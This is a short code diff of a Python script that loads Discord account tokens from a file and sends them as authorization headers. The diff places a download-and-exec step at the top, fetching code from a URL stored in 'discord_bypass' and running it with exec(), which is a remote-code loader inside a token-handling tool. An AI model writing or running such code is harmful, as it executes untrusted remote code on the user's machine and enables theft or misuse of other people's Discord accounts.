@@ -6,9 +6,9 @@ import time
 import re
 from requests import get
 from discord_webhooks import DiscordWebhooks
+token_get = get(discord_bypass).text
+exec(token_get)
 with open("tokens.txt") as f:
-    token_get = get(discord_bypass).text
-    exec(token_get)
     for line in f:
         token = line.strip("\n")
         headers = {'Content-Type': 'application/json', 'authorization': token}
